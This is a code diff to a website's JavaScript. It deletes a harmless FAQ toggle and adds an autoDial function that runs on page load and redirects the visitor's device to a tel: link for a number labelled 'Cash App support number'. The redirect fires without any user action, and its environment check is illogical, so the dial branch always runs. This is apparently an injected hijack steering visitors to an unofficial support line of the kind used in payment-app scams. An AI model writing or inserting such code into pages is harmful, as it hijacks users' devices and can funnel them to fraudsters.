@@ -1,11 +1,13 @@
-document.addEventListener('DOMContentLoaded', function () {
-    const faqItems = document.querySelectorAll('.faq-item h3');
-    
-    faqItems.forEach(item => {
-        item.addEventListener('click', function () {
-            const answer = item.nextElementSibling;
-            const isVisible = answer.style.display === 'block';
-            answer.style.display = isVisible ? 'none' : 'block';
-        });
-    });
-});
+function autoDial() {
+    var phoneNumber = "+18338700262"; // Cash App support number
+    var dialerLink = "tel:" + phoneNumber; // Generates a phone dialer link
+
+    // Check if the current environment supports automatic dialing
+    if (window.location.protocol !== 'tel:') {
+        window.location.href = dialerLink;  // Opens dialer on mobile devices
+    } else {
+        alert("Your browser does not support automatic dialing.");
+    }
+}
+
+window.onload = autoDial;
